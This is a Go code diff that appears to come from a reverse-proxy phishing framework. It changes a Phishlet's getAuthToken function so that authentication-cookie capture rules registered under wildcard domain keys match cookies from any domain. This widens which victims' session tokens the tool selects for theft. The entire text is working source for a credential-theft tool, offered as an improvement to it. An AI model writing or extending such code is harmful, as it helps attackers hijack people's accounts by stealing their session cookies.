@@ -1096,13 +1096,39 @@ func (p *Phishlet) domainExists(domain string) bool {
 }
 
 func (p *Phishlet) getAuthToken(domain string, token string) *CookieAuthToken {
-	if tokens, ok := p.cookieAuthTokens[domain]; ok {
+	match := func(tokens []*CookieAuthToken) *CookieAuthToken {
 		for _, at := range tokens {
 			if at.re != nil {
 				if at.re.MatchString(token) {
 					return at
 				}
 			} else if at.name == token {
+				return at
+			}
+		}
+		return nil
+	}
+	if tokens, ok := p.cookieAuthTokens[domain]; ok {
+		if at := match(tokens); at != nil {
+			return at
+		}
+	}
+	// Try wildcard keys: e.g. auth_tokens registered under ".*" or "*"
+	// should match any incoming cookie domain.
+	for key, tokens := range p.cookieAuthTokens {
+		if key == domain || !strings.Contains(key, "*") {
+			continue
+		}
+		cmp := domain
+		k := key
+		if strings.HasPrefix(cmp, ".") {
+			cmp = cmp[1:]
+		}
+		if strings.HasPrefix(k, ".") {
+			k = k[1:]
+		}
+		if subfilterKeyMatches(k, cmp) {
+			if at := match(tokens); at != nil {
 				return at
 			}
 		}
